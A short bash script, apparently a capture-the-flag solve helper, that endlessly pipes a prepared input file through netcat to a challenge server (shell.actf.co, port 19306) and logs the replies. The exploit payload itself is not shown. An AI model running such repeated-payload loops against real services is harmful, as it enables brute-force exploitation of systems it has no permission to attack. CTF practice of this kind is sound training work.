#!/bin/bash

while true; do
	(cat pie_inp2 | nc shell.actf.co 19306) >> pie_log
done

echo "Exiting."
